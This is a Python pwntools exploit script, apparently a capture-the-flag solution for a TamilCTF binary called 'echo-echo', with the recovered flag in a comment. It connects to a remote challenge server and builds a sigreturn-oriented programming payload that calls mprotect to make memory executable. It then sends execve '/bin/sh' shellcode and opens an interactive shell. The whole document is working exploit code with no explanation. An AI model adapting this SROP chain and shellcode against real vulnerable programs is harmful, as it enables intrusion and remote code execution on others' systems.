#TamilCTF{S_r0pE_1s_A_SuC1De_R0pE}
from pwn import *

#target = process("./echo-echo")
target = remote("3.97.113.25", 9002)
context.arch = "amd64"

payload = "A"*8
payload += p64(0x400096) + p64(0x40009b)

frame = SigreturnFrame()
frame.rip = 0x040009b
frame.rax = 10
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 7
frame.rsp = 0x400018
payload += str(frame) 
payload += p64(0x400080)

print("Length: " + hex(len(payload)))
target.sendline(payload)

raw_input("Give me somethin...")
target.sendline("B"*0xe)

raw_input("Give me somethin...")
shellcode = "\x90"*0xa0 +  "\x5f"*10 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
target.sendline(shellcode)

target.interactive()
